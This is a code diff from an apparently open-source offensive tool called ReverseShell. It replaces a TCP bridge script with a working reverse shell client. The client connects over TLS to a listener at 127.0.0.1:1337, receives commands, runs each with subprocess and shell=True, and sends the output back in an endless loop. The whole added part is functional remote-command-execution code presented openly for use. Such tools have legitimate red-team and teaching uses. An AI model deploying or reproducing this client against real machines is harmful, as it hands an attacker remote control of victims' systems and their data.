@@ -2,8 +2,8 @@
 # -*- coding: utf-8 -*-
 
 ###################
-#    TCP bridge for ReverseShell.
-#    Copyright (C) 2023  ReverseShell
+#    This package implements an advanced reverse shell console.
+#    Copyright (C) 2023  Maurice Lambert
 
 #    This program is free software: you can redistribute it and/or modify
 #    it under the terms of the GNU General Public License as published by
@@ -19,63 +19,63 @@
 #    along with this program.  If not, see <https://www.gnu.org/licenses/>.
 ###################
 
-'''
-TCP bridge for ReverseShell.
-'''
+"""
+This package implements an advanced reverse shell
+console (supports: TCP, UDP, IRC, HTTP and DNS).
+"""
 
 __version__ = "0.0.1"
 __author__ = "Maurice Lambert"
 __author_email__ = "mauricelambert434@gmail.com"
 __maintainer__ = "Maurice Lambert"
 __maintainer_email__ = "mauricelambert434@gmail.com"
-__description__ = '''
-TCP bridge for ReverseShell.
-'''
+__description__ = """
+This package implements an advanced reverse shell
+console (supports: TCP, UDP, IRC, HTTP and DNS).
+"""
+license = "GPL-3.0 License"
 __url__ = "https://github.com/mauricelambert/ReverseShell"
 
-# __all__ = []
-
-__license__ = "GPL-3.0 License"
-__copyright__ = '''
+copyright = """
 ReverseShell  Copyright (C) 2023  Maurice Lambert
 This program comes with ABSOLUTELY NO WARRANTY.
 This is free software, and you are welcome to redistribute it
 under certain conditions.
-'''
-copyright = __copyright__
-license = __license__
+"""
+__license__ = license
+__copyright__ = copyright
+
+__all__ = []
 
 print(copyright)
 
-from socket import socket, create_server
+from os.path import join
+from socket import socket
 from contextlib import suppress
+from subprocess import run, PIPE
+from ssl import SSLContext, PROTOCOL_TLS_CLIENT
 
-use_timeout = True
+context = SSLContext(PROTOCOL_TLS_CLIENT)
+context.load_verify_locations(join('..', 'server.crt'))
 
-address_server = ('127.0.0.1', 1337)
-address_destination = ('127.0.0.1', 1338)
+def sendall(data):
+    chunk = data[:30000]
+    data = data[30000:]
+    while chunk:
+        ss.sendall(chunk)
+        chunk = data[:30000]
+        data = data[30000:]
 
+
+data = b" "
 while True:
     with suppress(Exception):
-        while True:
-            socket_server = create_server(address_server)
-            socket_server.listen(1)
-
-            socket_client = socket()
-            connection, address = socket_server.accept()
-
-            socket_client.connect(address_destination)
-            data = connection.recv(65535)
-            connection.settimeout(0.5) if use_timeout else connection.setblocking(False)
-            while True:
-                try:
-                    data += connection.recv(65535)
-                except (BlockingIOError, TimeoutError):
-                    break
-            connection.setblocking(True)
-            socket_client.sendall(data)
-            data = socket_client.recv(65535)
-            socket_client.close()
-
-            connection.sendall(data)
-            socket_server.close()
+        s = socket()
+        ss = context.wrap_socket(s, server_hostname='localhost')
+        ss.connect(("127.0.0.1", 1337))
+        sendall(data)
+        command = ss.recv(65535).decode()
+        p = run(command, shell=True, stdout=PIPE, stderr=PIPE)
+        data = p.stdout or p.stderr or b" "
+        ss.close()
+        s.close()
